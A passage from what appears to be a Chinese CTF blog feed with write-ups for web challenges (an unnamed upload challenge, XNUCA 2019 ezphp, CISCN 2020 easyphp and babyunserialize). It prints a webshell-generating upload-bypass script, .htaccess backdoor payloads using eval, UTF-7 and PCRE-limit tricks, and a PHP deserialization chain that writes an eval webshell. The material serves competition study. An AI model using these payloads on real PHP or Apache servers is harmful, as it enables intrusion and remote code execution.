class="keyword">else</span>:</span><br><span class="line">                mid = (<span class="built_in">max</span> + <span class="built_in">min</span>) // <span class="number">2</span></span><br><span class="line">                userinfo = <span class="string">&quot;&#123;\&quot;username\&quot;:\&quot;test&quot;</span> + payload.<span class="built_in">format</span>(command=command, position=<span class="built_in">str</span>(i), operator=<span class="string">&quot;&gt;&quot;</span>,</span><br><span class="line">                                                                   mid=<span class="built_in">chr</span>(mid)) + <span class="string">&quot;\&quot;,\&quot;password\&quot;:\&quot;test\&quot;&#125;&quot;</span></span><br><span class="line">                cookies = &#123;<span class="string">&quot;userinfo&quot;</span>: base64.b64encode(userinfo)&#125;</span><br><span class="line">                r = requests.get(url=url, cookies=cookies)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;Welcome&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                    <span class="built_in">min</span> = mid</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">max</span> = mid</span><br><span class="line">        result += <span class="built_in">chr</span>(mid)</span><br><span class="line">        sys.stdout.write(<span class="string">&quot;\r%s&quot;</span> % result)</span><br><span class="line">        sys.stdout.flush()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p>得到用户名和密码为<strong>zzadmin</strong>和<strong>phptxdy</strong>，进去之后是一个文件上传，右键源代码。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$userdir</span> = <span class="string">&quot;images/&quot;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>]);</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$userdir</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">mkdir</span>(<span class="variable">$userdir</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$isadmin</span> &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;upload&quot;</span>]))&#123;</span><br><span class="line">    <span class="variable">$tmp_name</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;fileUpload&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>];</span><br><span class="line">    <span class="variable">$name</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;fileUpload&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">    <span class="variable">$extension</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$name</span>,<span class="title function_ invoke__">strrpos</span>(<span class="variable">$name</span>,<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/ph/i&quot;</span>,<span class="variable">$extension</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;hacker go away!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">mb_strpos</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$tmp_name</span>), <span class="string">&quot;&lt;?&quot;</span>) !== <span class="literal">FALSE</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;hacker go away!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$this_file</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$tmp_name</span>,<span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    <span class="variable">$bin</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$this_file</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$this_file</span>);</span><br><span class="line">    <span class="variable">$str_into</span> = @<span class="title function_ invoke__">unpack</span>(<span class="string">&quot;C1chars&quot;</span>,<span class="variable">$bin</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$str_into</span>[<span class="string">&quot;chars&quot;</span>]==<span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;hacker go away!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$image_type</span> = <span class="title function_ invoke__">exif_imagetype</span>(<span class="variable">$tmp_name</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="variable">$image_type</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;hacker go away!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$upload_file_path</span> = <span class="variable">$userdir</span>.<span class="string">&quot;/&quot;</span>.<span class="variable">$name</span>;</span><br><span class="line">    <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$tmp_name</span>, <span class="variable">$upload_file_path</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>没啥思路，随手搜了一下发现了<strong><a
href="https://www.cnblogs.com/wfzWebSecuity/p/11207145.html">writeup</a></strong>，改改脚本。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment"># Description : create and bypass file upload filter with .htaccess</span></span><br><span class="line"><span class="comment"># Author : Thibaud Robin</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Will prove the file is a legit xbitmap file and the size is 1337x1337</span></span><br><span class="line">SIZE_HEADER = <span class="string">b&quot;\n\n#define width 1337\n#define height 1337\n\n&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_php_file</span>(<span class="params">filename, script</span>):</span><br><span class="line">    phpfile = <span class="built_in">open</span>(filename, <span class="string">&#x27;wb&#x27;</span>) </span><br><span class="line"></span><br><span class="line">    phpfile.write(script.encode(<span class="string">&#x27;utf-16be&#x27;</span>))</span><br><span class="line">    phpfile.write(SIZE_HEADER)</span><br><span class="line"></span><br><span class="line">    phpfile.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_htacess</span>():</span><br><span class="line">    htaccess = <span class="built_in">open</span>(<span class="string">&#x27;.htaccess&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    htaccess.write(SIZE_HEADER)</span><br><span class="line">    htaccess.write(<span class="string">b&#x27;AddType application/x-httpd-php .south\n&#x27;</span>)</span><br><span class="line">    htaccess.write(<span class="string">b&#x27;php_value zend.multibyte 1\n&#x27;</span>)</span><br><span class="line">    htaccess.write(<span class="string">b&#x27;php_value zend.detect_unicode 1\n&#x27;</span>)</span><br><span class="line">    htaccess.write(<span class="string">b&#x27;php_value display_errors 1\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    htaccess.close()</span><br><span class="line">        </span><br><span class="line">generate_htacess()</span><br><span class="line"></span><br><span class="line">generate_php_file(<span class="string">&quot;webshell.south&quot;</span>, <span class="string">&quot;&lt;?php system($_GET[&#x27;cmd&#x27;]); die(); ?&gt;&quot;</span>)</span><br><span class="line">generate_php_file(<span class="string">&quot;scandir.south&quot;</span>, <span class="string">&quot;&lt;?php echo implode(&#x27;\n&#x27;, scandir($_GET[&#x27;dir&#x27;])); die(); ?&gt;&quot;</span>)</span><br><span class="line">generate_php_file(<span class="string">&quot;getfile.south&quot;</span>, <span class="string">&quot;&lt;?php echo file_get_contents($_GET[&#x27;file&#x27;]); die(); ?&gt;&quot;</span>)</span><br><span class="line">generate_php_file(<span class="string">&quot;info.south&quot;</span>, <span class="string">&quot;&lt;?php phpinfo(); die(); ?&gt;&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>采用<strong>xbm</strong>格式【<strong>X Bit
Map</strong>，绕过<strong>exif_imagetype()</strong>函数的检测，上传<strong>.htaccess</strong>文件来解析🐎。</p>
<p>在计算机图形学中，<strong>X Window</strong>系统使用<strong>X
BitMap</strong>，一种纯文本二进制图像格式，用于存储<strong>X
GUI</strong>中使用的光标和图标位图。
<strong>XBM</strong>数据由一系列包含单色像素数据的静态无符号字符数组组成，当格式被普遍使用时，XBM通常出现在标题【<strong>.h</strong>文件中，每个图像在标题中存储一个数组。</p>
<p>也就是用<strong>c</strong>代码来标识一个<strong>xbm</strong>文件，前两个<strong>#defines</strong>指定位图的高度和宽度【以像素为单位，比如以下<strong>xbm</strong>文件：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#define test_width 16</span><br><span class="line">#define test_height 7</span><br><span class="line">static char test_bits[] = &#123;0x13, 0x00, 0x15, 0x00, 0x93, 0xcd, 0x55, 0xa5, 0x93, 0xc5, 0x00, 0x80,0x00, 0x60 &#125;;</span><br></pre></td></tr></table></figure>
<p>再利用不同编码写🐎来绕过文件头的字符串检测。</p>
<p>先传<strong>.htaccess</strong>，再传<strong>webshell.south</strong>，然后<strong>?cmd=cat%20/flag</strong>，得到<strong>flag{e7ae3e5e43b6de4bc0a83c6ade652bdf}</strong>。</p>
<h3 id="refer">Refer</h3>
<p><a
href="https://www.cnblogs.com/wfzWebSecuity/p/11207145.html">Insomni’hack
CTF-l33t-hoster复现分析</a></p>
<p><a href="http://she1don.cn/index.php/archives/27.html">python
沙盒逃逸 / SSTI</a></p>
]]></content>
      <categories>
        <category>题解</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>CTF</tag>
        <tag>Misc</tag>
        <tag>Crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>2019 XNUCA 线上预选赛 部分题解</title>
    <url>/2019-XNUCA-Preliminary/</url>
    <content><![CDATA[<p>我太南了，我也想去深大打线下。</p>
<span id="more"></span>
<h3 id="ezphp">ezphp</h3>
<p>源码。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$files</span> = <span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;./&#x27;</span>); </span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$file</span> !== <span class="string">&quot;index.php&quot;</span>) &#123;</span><br><span class="line">                <span class="title function_ invoke__">unlink</span>(<span class="variable">$file</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include_once</span>(<span class="string">&quot;fl3g.php&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>]) || !<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>])) &#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stristr</span>(<span class="variable">$content</span>,<span class="string">&#x27;on&#x27;</span>) || <span class="title function_ invoke__">stristr</span>(<span class="variable">$content</span>,<span class="string">&#x27;html&#x27;</span>) || <span class="title function_ invoke__">stristr</span>(<span class="variable">$content</span>,<span class="string">&#x27;type&#x27;</span>) || <span class="title function_ invoke__">stristr</span>(<span class="variable">$content</span>,<span class="string">&#x27;flag&#x27;</span>) || <span class="title function_ invoke__">stristr</span>(<span class="variable">$content</span>,<span class="string">&#x27;upload&#x27;</span>) || <span class="title function_ invoke__">stristr</span>(<span class="variable">$content</span>,<span class="string">&#x27;file&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hacker&quot;</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[^a-z\.]/&quot;</span>, <span class="variable">$filename</span>) == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hacker&quot;</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$files</span> = <span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;./&#x27;</span>); </span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$file</span> !== <span class="string">&quot;index.php&quot;</span>) &#123;</span><br><span class="line">                <span class="title function_ invoke__">unlink</span>(<span class="variable">$file</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$content</span> . <span class="string">&quot;\nJust one chance&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
<p>一个<strong>file_put_contents()</strong>函数来写入文件，但过滤了内容和文件名，内容不许含有<strong>on、html、type、flag、upload、file</strong>等关键词，文件名只许由字母和点组成。</p>
<p>尝试直接写入🐎，但是<strong>php</strong>不解析，猜测应该是在<strong>Apache</strong>的配置文件中做了限制，也无法覆盖<strong>index.php</strong>，猜测是由于其为<strong>root</strong>权限，思来想去，切入点应该是在<strong>.htaccess</strong>写🐎，可以使用<strong>\</strong>转义换行符连接上下文注释掉<strong>Just
one chance</strong>，同时绕过过滤。</p>
<p>于是达成了非预期解。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php_value auto_append_fi\</span><br><span class="line">le .htaccess</span><br><span class="line">#&lt;?php eval($_POST[&quot;south&quot;]); ?&gt;\</span><br></pre></td></tr></table></figure>
<p><strong>Payload</strong>如下。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?filename=.htaccess&amp;content=php_value%20auto_append_fi%5C%0Ale%20.htaccess%0A%23%3C%3Fphp%20eval(%24_POST%5B%22south%22%5D)%3B%20%3F%3E%5C</span><br><span class="line">/?filename=.htaccess&amp;content=php_value%20auto_append_fi%5C%0Ale%20.htaccess%0A%23%3C%3Fphp%20phpinfo()%3B%20%3F%3E%5C</span><br></pre></td></tr></table></figure>
<h4 id="预期解">预期解</h4>
<h5 id="利用文件包含">利用文件包含</h5>
<p>代码中存在一个<strong>include_once("fl3g.php");</strong>，因此可以配置<strong>PHP</strong>配置文件中的<strong>include_path</strong>来设置<strong>include</strong>文件根目录路径。</p>
<h5 id="报错写入后门">报错写入后门</h5>
<p>在<strong>PHP</strong>配置文件中有一项配置<strong>error_log</strong>可以将指定的报错信息写入指定文件，而写入的内容则同样可以通过控制<strong>include_path</strong>的值来控制，此处可以将值设为后门代码。</p>
<p>同时有一点比较常见的即是写入<strong>log</strong>的文件会被<strong>HTML</strong>编码，此时可以使用<strong>UTF-7</strong>编码绕过。</p>
<p>以及有一个配置<strong>error_reporting</strong>用来指定报错级别，<strong>32767</strong>意味着记录全部报错信息。</p>
<p>这一步先生成后门文件，设置了<strong>error_log</strong>路径和<strong>error_reporting</strong>级别，将后门代码进行<strong>UTF-7</strong>编码作为不存在的文件名写入<strong>log</strong>。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php_value error_log /tmp/fl3g.php</span><br><span class="line">php_value error_reporting 32767</span><br><span class="line">php_value include_path &quot;+ADw?php eval($_GET[1])+ADs +AF8AXw-halt+AF8-compiler()+ADs&quot;</span><br><span class="line"># \</span><br></pre></td></tr></table></figure>
<p><strong>Payload</strong>如下。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?filename=.htaccess&amp;content=php_value%20error_log%20%2Ftmp%2Ffl3g.php%0Aphp_value%20error_reporting%2032767%0Aphp_value%20include_path%20%22%2BADw%3Fphp%20eval(%24_GET%5B1%5D)%2BADs%20%2BAF8AXw-halt%2BAF8-compiler()%2BADs%22%0A%23%20%5C</span><br></pre></td></tr></table></figure>
<p>然后再次写入正确的<strong>include_path</strong>，即上一个<strong>Payload</strong>以后门代码作为文件名报错生成的后门路径，同时设置解码方式为<strong>UTF-7</strong>。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php_value include_path &quot;/tmp&quot;</span><br><span class="line">php_value zend.multibyte 1</span><br><span class="line">php_value zend.script_encoding &quot;UTF-7&quot;</span><br><span class="line"># \</span><br></pre></td></tr></table></figure>
<p><strong>Payload</strong>如下。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?filename=.htaccess&amp;content=php_value%20include_path%20%22%2Ftmp%22%0Aphp_value%20zend.multibyte%201%0Aphp_value%20zend.script_encoding%20%22UTF-7%22%0A%23%20%5C</span><br></pre></td></tr></table></figure>
<h4 id="另一个非预期">另一个非预期</h4>
<p><strong><a
href="https://xz.aliyun.com/t/6101">ROIS</a></strong>的解法。</p>
<p>对于此处<strong><span
class="math inline">\(content**的过滤，最简单的方法便是编码绕过，同时**\)</span>filename</strong>可控，即可以使用<strong>php://filter</strong>伪协议对其写入。</p>
<p>而对此的<strong>preg_match()</strong>函数的检测，结合<strong>PHITHON</strong>师傅的一篇<a
href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html"><strong>PHP</strong>利用<strong>PCRE</strong>回溯次数限制绕过某些安全限制</a>，对<strong>.htaccess</strong>配置<strong>pcre.backtrack_limit</strong>为<strong>0</strong>绕过，同时由于<strong>PHP7</strong>的环境，需要再配置<strong>pcre.jit</strong>为<strong>0</strong>。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php_value pcre.backtrack_limit 0</span><br><span class="line">php_value pcre.jit 0</span><br><span class="line">#aa\</span><br></pre></td></tr></table></figure>
<p><strong>Payload</strong>如下。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?content=php_value%20pcre.backtrack_limit%200%0a%0dphp_value%20pcre.jit%200%0a%0d%0a%0d%23aa\&amp;filename=.htaccess</span><br></pre></td></tr></table></figure>
<p>然后<strong>preg_match()</strong>失效，此时再使用伪协议来写入文件。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php_value pcre.backtrack_limit    0</span><br><span class="line"></span><br><span class="line">php_value auto_append_file    &quot;.htaccess&quot;</span><br><span class="line"></span><br><span class="line">php_value pcre.jit   0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#aa&lt;?php eval($_GET[&#x27;a&#x27;]);?&gt;\</span><br></pre></td></tr></table></figure>
<p><strong>Payload</strong>如下。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?a=system(&#x27;cat ../../../flag&#x27;);exit;&amp;content=cGhwX3ZhbHVlIHBjcmUuYmFja3RyYWNrX2xpbWl0ICAgIDAKDXBocF92YWx1ZSBhdXRvX2FwcGVuZF9maWxlICAgICIuaHRhY2Nlc3MiCg1waHBfdmFsdWUgcGNyZS5qaXQgICAwCg0KDSNhYTw/cGhwIGV2YWwoJF9HRVRbJ2EnXSk7Pz5c&lt;&lt;&amp;filename=php://filter/write=convert.base64-decode/resource=.htaccess</span><br></pre></td></tr></table></figure>
<h3 id="hardjs">HardJS</h3>
]]></content>
      <categories>
        <category>题解</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>2020 第十三届全国大学生信息安全竞赛 创新实践能力赛 线上初赛 部分题解</title>
    <url>/2020-CISCN-Preliminary/</url>
    <content><![CDATA[<p><img
src="/images/2020-CISCN-Preliminary/89E955944D8805B2DA4CAD39BF17F5B8.gif" /></p>
<span id="more"></span>
<h1 id="web">Web</h1>
<h2 id="easyphp">easyphp</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">//题目环境：php:7.4.8-apache</span></span><br><span class="line">    <span class="variable">$pid</span> = <span class="title function_ invoke__">pcntl_fork</span>();</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$pid</span> == -<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;could not fork&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$pid</span>)&#123;</span><br><span class="line">        <span class="variable">$r</span>=<span class="title function_ invoke__">pcntl_wait</span>(<span class="variable">$status</span>);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">pcntl_wifexited</span>(<span class="variable">$status</span>))&#123;</span><br><span class="line">            <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>])&amp;&amp;<span class="title function_ invoke__">is_string</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>])&amp;&amp;!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[:\\\\]|exec|pcntl/i&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]))&#123;</span><br><span class="line">            <span class="title function_ invoke__">call_user_func_array</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>],[<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>],<span class="literal">false</span>,<span class="literal">true</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">posix_kill</span>(<span class="title function_ invoke__">posix_getpid</span>(), SIGUSR1);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p><strong>a</strong> 传入
<strong>call_user_func</strong>，<strong>b</strong> 直接
<strong>Fuzz</strong> 看看。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">foreach</span> (<span class="title function_ invoke__">get_defined_functions</span>()[<span class="string">&#x27;internal&#x27;</span>] <span class="keyword">as</span> <span class="variable">$r</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">print_r</span>(<span class="variable">$r</span> . <span class="string">&quot;&lt;br/&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img
src="/images/2020-CISCN-Preliminary/image-20200821132124618.png" /></p>
<p>发现直接过了，回显一个
<strong>Phpinfo</strong>，<strong>flag</strong> 在环境变量里。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;00c27187-f94d-4cbb-a7c6-9bb6d985e959&#125;</span><br></pre></td></tr></table></figure>
<h2 id="babyunserialize">babyunserialize</h2>
<p>扫描发现有<strong>www.zip</strong>的源码泄露，点开发现是<strong>Wmctf</strong>的<strong>webweb</strong>，找了个<strong>Payload</strong>打发现被<strong>ban</strong>了几个函数，只能再找一个链了。</p>
<p>全局搜一下**__destruct<strong>方法，</strong>fatfree/lib/db/jig.php**这儿有一个看起来可以用。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *	save file on destruction</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;lazy) &#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;lazy = <span class="literal">FALSE</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;data?:[] <span class="keyword">as</span> <span class="variable">$file</span> =&gt; <span class="variable">$data</span>)</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$file</span>,<span class="variable">$data</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *	Write data to memory/file</span></span><br><span class="line"><span class="comment"> *	<span class="doctag">@return</span> int</span></span><br><span class="line"><span class="comment"> *	<span class="doctag">@param</span> $file string</span></span><br><span class="line"><span class="comment"> *	<span class="doctag">@param</span> $data array</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"><span class="variable">$file</span>,<span class="keyword">array</span> <span class="variable">$data</span>=<span class="literal">NULL</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable language_">$this</span>-&gt;dir || <span class="variable language_">$this</span>-&gt;lazy)</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">count</span>(<span class="variable">$this</span>-&gt;data[<span class="variable">$file</span>]=<span class="variable">$data</span>);</span><br><span class="line">    <span class="variable">$fw</span>=<span class="title class_">\Base</span>::<span class="title function_ invoke__">instance</span>();</span><br><span class="line">    <span class="keyword">switch</span> (<span class="variable language_">$this</span>-&gt;format) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="built_in">self</span>::<span class="variable constant_">FORMAT_JSON</span>:</span><br><span class="line">            <span class="variable">$out</span>=<span class="title function_ invoke__">json_encode</span>(<span class="variable">$data</span>,JSON_PRETTY_PRINT);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="built_in">self</span>::<span class="variable constant_">FORMAT_Serialized</span>:</span><br><span class="line">            <span class="variable">$out</span>=<span class="variable">$fw</span>-&gt;<span class="title function_ invoke__">serialize</span>(<span class="variable">$data</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$fw</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;dir.<span class="variable">$file</span>,<span class="variable">$out</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *	Exclusive file write</span></span><br><span class="line"><span class="comment"> *	<span class="doctag">@return</span> int|FALSE</span></span><br><span class="line"><span class="comment"> *	<span class="doctag">@param</span> $file string</span></span><br><span class="line"><span class="comment"> *	<span class="doctag">@param</span> $data mixed</span></span><br><span class="line"><span class="comment"> *	<span class="doctag">@param</span> $append bool</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"><span class="variable">$file</span>,<span class="variable">$data</span>,<span class="variable">$append</span>=<span class="literal">FALSE</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>,<span class="variable">$data</span>,<span class="variable">$this</span>-&gt;hive[<span class="string">&#x27;LOCK&#x27;</span>]|(<span class="variable">$append</span>?<span class="attr">FILE_APPEND</span>:<span class="number">0</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>尝试着构造一下。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">DB</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Jig</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span></span><br><span class="line">        <span class="variable">$uuid</span>,</span><br><span class="line">        <span class="variable">$dir</span> = <span class="string">&#x27;./&#x27;</span>,</span><br><span class="line">        <span class="variable">$format</span> = <span class="number">1</span>,</span><br><span class="line">        <span class="variable">$log</span>,</span><br><span class="line">        <span class="variable">$data</span> = <span class="keyword">array</span>(<span class="string">&#x27;./south.php&#x27;</span>=&gt;[<span class="string">&#x27;&lt;?php echo south; phpinfo(); eval($_POST[&quot;south&quot;]); ?&gt;&#x27;</span>]),</span><br><span class="line">        <span class="variable">$lazy</span> = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Jig</span>()));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 